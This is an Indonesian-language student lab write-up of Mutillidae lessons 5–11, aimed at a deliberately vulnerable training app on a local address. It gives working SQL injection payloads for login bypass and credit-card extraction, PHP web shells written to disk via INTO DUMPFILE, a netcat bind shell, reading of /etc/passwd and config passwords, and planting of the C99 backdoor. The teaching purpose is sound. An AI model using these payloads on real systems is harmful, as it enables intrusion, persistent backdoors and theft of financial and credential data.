# Mutillidae

## Lesson 5 - Manual SQL Injection with Firebug

1. Jalankan Firefox pada BackTrack

2. Akses `http://ipmutillidae/mutillidae` dari Firefox. IP mutillidae yang digunakan adalah  <b>192.168.56.1</b> sehingga URL yang diakses menjadi `http://192.168.56.1/mutillidae`

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_01.png)

### Single Quote Test On Username Field

3. Klik Login/Register

4. Masukkan tanda <b>`(')`</b> pada textbox Name lalu klik Login

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_02.png)

5. Setelah itu akan muncul error message

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_03.png)

### By-Pass Password Without Username

6. Ubah isi dari textbox name menjadi <b>`' or 1=1-- `</b>. Tambahkan spasi setelah karakter `-- `

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_04.png)

7. Klik login dan user akan login sebagai <b>admin</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_05.png)

8. Logout dari session

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_06.png)

### Single Quote Test On Password Field

9. Klik Login/Register 

10. Masukkan <b> `samurai` </b> pada textbox Name

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_07.png)

10. Klik kanan pada textbox Password dan klik Inspect Element

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_08.png)

11. Ubah string <b>`password`</b> 

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_09.png)

   menjadi <b>`text`</b>
   
 ![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_10.png)
 
12. Masukkan tanda <b> `'` </b> pada textbox password lalu klik Login. Maka akan muncul halaman error message.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/fix1.png)

13. Klik Login/Register

14. Masukkan  <b> `samurai` </b> pada textbox Name

15. Klik kanan pada textbox Password dan klik Inspect Element

16. Ubah string <b>`password`</b> menjadi <b>`text`</b>

17. Masukkan <b>`' or 1=1-- `</b> pada textbox Password. Tambahkan spasi setelah karakter `-- `

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_11.png)

18. Klik Login. Maka user akan login sebagai <b>admin</b>, bukan samurai

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_12.png)

19. Logout dari session

20. Klik Login/Register

21. Masukkan  <b> `samurai` </b> pada textbox Name

22. Klik kanan pada textbox Password dan klik Inspect Element

23. Ubah string <b>`password`</b> menjadi <b>`text`</b>, <b>`size="20"`</b> menjadi <b>`size="50"`</b>, dan <b>`maxlength="20"`</b> menjadi <b>`maxlength="50"`</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_13.png)

24. Masukkan <b>`' or (1=1 and username='samurai')-- `</b> pada textbox Password. Tambahkan spasi setelah karakter `-- `

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_14.png)

25. Klik Login dan user akan login sebagai <b>samurai</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_15.png)

26. Buka terminal pada ubuntu dan masuk sebagai user root dengan perintah `su - root`

27. Login ke mysql dan masukkan perintah berikut
```
mysql -u root -p
show databases;
use nowasp;
```
![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_16.png)

28. Lihat daftar tabel yang ada dan pilih tabel <b>`accounts`</b> dengan perintah berikut
```
show tables;
desc accounts;
```

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_17.png)

29. Tampilkan isi dari tabel <b>`accounts`</b>
```
select * from accounts;
```

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_18.png)

```
select * from accounts where username = '' and password = '';
select * from accounts where username = 'samurai' and password = 'abcdfgh';
select * from accounts where username = 'samurai'; -- and password = 'abcdfgh';
```

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_19.png)

```
select * from accounts where username = ''' and password = '';
select * from accounts where username = '' or 1=1; -- and password = '';
```
![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_20.png)

### Proof of Lab

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_21.png)


## Lesson 6 - SQL Injection, Burpsuite, cURL, Man-In-The-Middle Attack

1. Jalankan Firefox pada BackTrack

2. Akses mutillidae dari Firefox. IP mutillidae yang digunakan adalah  <b>192.168.56.1</b> sehingga URL yang diakses menjadi `http://192.168.56.1/mutillidae`

3. Klik login

4. Konfigurasi proxy pada Firefox melalui <b>Edit --> Preferences --> Network --> Settings...</b> dengan memilih <b>Manual proxy configurations</b>. Masukkan <b>`127.0.0.1`</b> pada textbox HTTP Proxy dan <b>`8080`</b> pada textbox Port. Centang <b>Use the proxy server for all protocols</b> lalu klik OK.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_04.png)

5. Jalankan <b>Burp Suite</b> dengan mengeklik <b>Applications --> BackTrack --> Vulnerability Assessment --> Web Application Assessment ---> Web Application Proxies --> burpsuite</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_05.png)

7. Setting proxy pada burp suite dengan mengeklik <b>proxy</b> tab --> mengeklik <b>options</b> tab --> pastikan <b>port = 8080</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_08.png)

8. Nyalakan intercept dengan mengeklik <b>intercept</b> tab dan pastikan terdapat tombol <b>intercept is off</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_09.png)

10. Login mutillidae tanpa menggunakan password dengan mengisikan <b>`' or 1=1-- `</b> pada textbox Name

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_10.png)

11. Klik <b>proxy</b> tab pada Burp Suite --> klik <b>history</b> tab --> pada tabel yang muncul, klik baris yang mengandung <b>`/mutillidae/index.php?page=login.php`</b> --> klik <b>request</b> tab --> klik <b>raw</b> tab -->

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_11.png)

12. Logout dari session

13. Gunakan Curl untuk login dengan POST data dengan memasukkan perintah berikut
```
curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=%27+or+1%3D1--+&password=&login-php-submit-button=Login" --location "http://192.168.56.1/mutillidae/index.php?page=login.php" > login1.txt
```

<b>192.168.56.1</b> adalah IP mutillidae yang digunakan

14. Masukkan perintah berikut
```
grep "Logged In" login1.txt
cat crack_cookies.txt
```

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_12.png)

15. Login kembali dengan username <b>`samurai`</b> dan klik inspect element pada password

16. Ganti password dnegan `or(1=1 and username='samurai')--`

17. Buka burpsuite dan atur seperti gambar dibawah ini kemudian simpan

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_13.png)

18. Menampilkan post data dengan burpsuite kemudain logout dari mutillidae dan tutup browser

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_15.png)

19. Uji coba menggunakan curl untuk login

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_16.png)

20. Buka kembali browser, matikan proxy, buka Cookies Manager+

21. Tambahkan cookie PHPSESSID

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_20.png)

22. Tambahkan cookie showhints

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_22.png)

23. Tambahkan cookie username

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_23.png)

24. Tambahkan cookie uid

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_24.png)

26. Buka mutillidae maka akan didapatkan tampilan sebagai berikut 

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_25.png)

27. Proof of lab

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m6_26.png)

## Lesson 7 - SQL Injection, Burpsuite, cURL, Perl Parser

1. Buka mutillidae pada browser dan buka user info page serta konfigurasi proxynya menjadi manual proxy seperti yang telah dijelaskan sebelumnya

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_04.png)

2. Menjalankan Burpsuite dengan membuka menu Applications -> BackTrack -> Vulnerability Assessment -> Web Application Assesment -> Web Application Proxies -> burpsuite
Jika muncul pemberitahuan, klik OK

3. Atur proxy pada port 8080 dan matikan intercept

4. Dapatkan userlist tanpa password dengan menginputkan pada nama ` or 1=1-- `

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_05.png)

5. Berikut adalah hasilnya

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_06.png)

6. Hasil yang diperoleh dari burpsuite adalah sebagai berikut

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_07.png)

7. Gunakan cURL untuk menampilkan username dan password

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_08.png)

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_94.png)

8. Menampilkan hasil

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_10.png)

9. Jalankan Perl Script

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_12.png)

10. Proof of Lab

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_13.png)

## Lesson 8 - SQL Injection Union Exploit #1

1. Mencoba melakukan union dengan menggunakan database mutillidae
`mysql -uroot -psamurai`
`use nowasp;`
`select * from accounts union select ccid,ccnumber,ccv,expiration,null from credit_card;`

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_02.jpg)

2. Mengakses mutillidae melalui browser dari backtrack
`192.168.56.1/mutillidae`

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m5_01.png)

3. Membuka user info pada menu OWASP Top 10 -> SQL Injection -> SQLi-Extract Data -> User Info

4. Mengatur proxy pada menu Edit -> Preferences -> Advanced -> Network -> Tombol Setting menjadi sebagai berikut 

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_09.jpg)

5. Menjalankan Burpsuite dengan membuka menu Applications -> BackTrack -> Vulnerability Assessment -> Web Application Assesment -> Web Application Proxies -> burpsuite
Jika muncul pemberitahuan, klik OK
Buka menu proxy -> options dan atur sebagai berikut :

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_17.jpg)

6. Matikan intercept

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m7_12.jpg)

7. Lakukan inspect element

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_01.png)

8. Inputkan ` union select null --` pada form nama

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_03.png)

9. Error yang dihasilkan adalah sebagai berikut

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_04.png)

10. Uji coba selanjutnya, inputkan ` union select null,null,null,null,null,null,null --` pada form name

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_05.png)

11. Hasilnya adalah sebagai berikut

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_06.png)

12. Selanjutnya dilakukan uji coba menginputkan ` union select 1,2,3,4,5,6,7 --` maka hasilnya adalah

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_08.png)

13. Inputkan ` union select ccid,ccnumber,ccv,expiration,null from credit_cards --` maka diperoleh hasil

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_10.png)

14. Melihat post data dengan Burp Suite

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_11.png)

15. Gunakan cURL untuk menampilkan username dan password

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_12.png)

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_13.png)

16. Buat hasil dengan melakukan perintah `cat lesson8.txt` kemudian download output parser

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_15.png)

17. Jalankan perl script

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_16.png)

### Lesson 9 - SQL Injection Union Exploit #2 (Create Output File)

1. Simpan output dari Union Table ke dalam file `/tmp/CCN.csv` dengan perintah
```
RLIKE '^[0-9]' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/tmp/CCN.csv' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED by '\n';
```

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_03.png)

2. Untuk melihat hasilnya gunakan perintah `\! cat /tmp/CCN.csv`

3. Akses mutillidae dari backtrack dengan url `http://192.168.56.1/mutillidae`

4. Buka User info melalui <b>OWASP Top 10</b> --> <b>A1 - SQL Injection</b> --> <b>SQLi - Extract Data</b> --> <b>User Info</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_04.png)

5. Lakukan inspect element pada textbox name dan ubah <b>`size`</b> dari 20 menjadi <b>`100`</b>

6. Isi Name dengan `' union select ccid,ccnumber,ccv,expiration,null from credit_cards --`

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_06.png)

7. Klik tombol <b>View Account Details</b>

8. Username akan terisi dengan credit card number, password terisi dengan CCVm dan signature terisi dengan expiration

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_07.png)

9. Buka kembali User Info

10. Lakukan inspect elemen pada name dan ubah <b>`size`</b> menjadi <b>`100`</b>

11. Lakukan mysql union injection dengan memasukkan kode berikut pada Name
```
' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/html/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- 
```
![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_08.png)

12. Akan muncul hasil seperti gambar

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_09.png)

13. Buka tab baru dan buka `192.168.56.1/mutillidae/CCN2.txt`

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_10.png)


## Lesson 10 - SQL Injection Union Exploit #3 (Create PHP Execution Script)

1. Akses mutillidae dari BackTrack dengan URL `http://192.168.56.1/mutillidae`

2. Buka <b>User Info</b>

3. Inspect element pada textbox Name  dan ubah <b>`size`</b> dari 20 menjadi <b>`100`</b>

4. Isi textbox name dengan perintah berikut lalu klik tombol <b> View Account Details</b>
```
' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' --
```
![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_01.png)

5. Akan muncul hasil seperti pada gambar

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_02.png)

6. Ubah URL menjadi `http://192.168.56.1/mutillidae/execute_command.php`

7. Masukkan `whoami; pwd` lalu klik tombol <b> Execute Command </b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_03.png)

8. Untuk melihat user yangberstatus logged on maka masukkan perintah `w` lalu klik tombol <b>Execute Command</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_04.png)

9. Untuk melihat potential services to attack, masukkan perintah `cat /etc/passwd/` lalu <b>Execute Command</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_05.png)

10. Untuk melakukan pengamatan pada network, masukkan perintah `netstat -nao | grep "0.0.0.0:"` lalu <b> Execute Command</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_06.png)

11. Untuk mendapatkan password dari database, masukkan perintah `find * -name "*.php" | xargs grep -i "password" | grep "="` lalu <b> Execute Command</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_07.png)

password = `root`

12. Untuk menampilkan file PHP yang berisi database configuration, masukkan perintah `cat classes/MySQLHandler.php | grep -v "<?php"` lalu <b>Execute Command</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_08.png)

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_09.png)
   
13. Untuk menghitung jumlah koneksi pada suatu port, masukkan perintah `which nc; netstat -nao | grep 4444 | wc -l` lalu <b>Execute Command</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_10.png)

14. Untuk menjalankan netcat, masukkan perintah `mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe` lalu <b>Execute Command</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_11.png)

15. Untuk menjalankan netcat, masukkan perintah `mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe` lalu <b>Execute Command</b>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_11.png)

16. Buka terminal pada BackTrack, ketik perintah `nc 192.168.1 4444` agar terhubung dengan netcat

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_12.png)

17. Untuk melihat data dari tabel credit card, ketik perintah berikut
```
echo "show databases;" | mysql -uroot -proot
echo "use nowasp; show tables;" | mysql -uroot -proot
echo "select * from nowasp.credit_cards;" | mysql -uroot -proot
```
![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_13.png)

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_14.png)


Referensi : http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson10/index.html

## Lesson 11 - SQL Injection Union Exploit #4 (Create PHP Upload Script)

### Pre-Requisite

1. Buka terminal dan masukkan perintah mkdir -p /root/backdoor.
2. Buka Mozilla dan buka halaman: https://r57.gen.tr/, klik tombol Priv c99 Shell download.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_03.1.png)

3. Simpan C99.zip pada /root/backdoor.
4. Mount C99.zip, dan Copy C99.php dari hasil Archive Mount ke /root/backdoor

### Langkah

1. Masuk pada Mozilla, dan buka website : ttp://192.168.56.1/mutillidae.
2. Kemudian buka OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info.
3. Klik kanan pada tombol View Accounts Details, klik inpect element.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_04.png)

4. Ubah kalimat style="text-align:, dari center to left. Kemudian tutup firebug.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_06.png)

5. Klik kanan pada tombol Name Textbox, klik inpect element.
6. Ubah kalimat "size=", dari 20 menjadi 550. Kemudian tutup firebug.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_07.png)

7. Pada Name Textbox inputkan kalimat berikut.  Ingat untuk memberikan spasi setelah simbol "--".
<pre>' union select null,null,null,null,null,null,'<html><body><div><?php if(isset($_FILES["fupload"])) { $source = $_FILES["fupload"]["tmp_name"]; $target = $_FILES["fupload"]["name"]; move_uploaded_file($source,$target); system("chmod 777 $target"); $size = getImageSize($target); } ?></div><form enctype="multipart/form-data" action="<?php print $_SERVER["PHP_SELF"]?>" method="post"><p><input type="hidden" name="MAX_FILE_SIZE" value="500000"><input type="file" name="fupload"><br><input type="submit" name="upload!"><br></form></body></html>' INTO DUMPFILE '/var/www/html/mutillidae/upload_file.php' -- </pre>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_08.png)

8. Error umum akan muncul bersamaan dengan hasil dari sql inject yang membuat file upload_file.php pada server.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_09.png)

9. Buka halaman: http://192.168.56.1/mutillidae/upload_file.php
10. Pilih Browse button, dan pilih file C99.php. Kemudian klik Submit Query.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_10.png)

11. Buka halaman: http://192.168.56.1/mutillidae/C99.php
12. Klik Sec.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_11.png)

13. Inputkan pwd pada Enter dan klik Execute.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_12.png)

14. Hasil dari perintah tersebut adalah direktori aktif dari web server, kemudian inputkan perintah:
<pre>find /var/www/html/mutillidae -name "*.php" | xargs grep -i "password" | grep "="</pre>

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_13.png)

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_14.png)

15. Dari hasil tersebut dapat terlihat file yang menyimpan informasi tentang database.
16. Masukkan perintah:
<pre>find /var/www/html/mutillidae -name "MySQLHandler.php" | xargs cat | sed 's/</\&#60;/g' | sed 's/>/\&#62;/g' /var/www/html/mutillidae/classes/MySQLHandler.php</pre>
17. Akan didapatkan nilai dari Database username, password, dan nama.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_15.png)

18. Klik SQL, kemudian masukkan data yang telah didapatkan dan klik Connect.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_16.png)

19. Klik table accounts.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_17.png)

20. Klik [Insert].

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_18.png)

21. Isikan data yang ingin anda tambahkan dan klik Confirm.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_18.1.png)

22. Klik Yes dan data ditambahkan, kemudian kembali pada halaman langkah 20.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_19.png)

23. Klik [Dump]
24. Isikan data sesuai keinginan dan klik 'Dump'.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_20.png)

25. Simpan dump pada tempat yang anda inginkan.

![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_21.png)





 
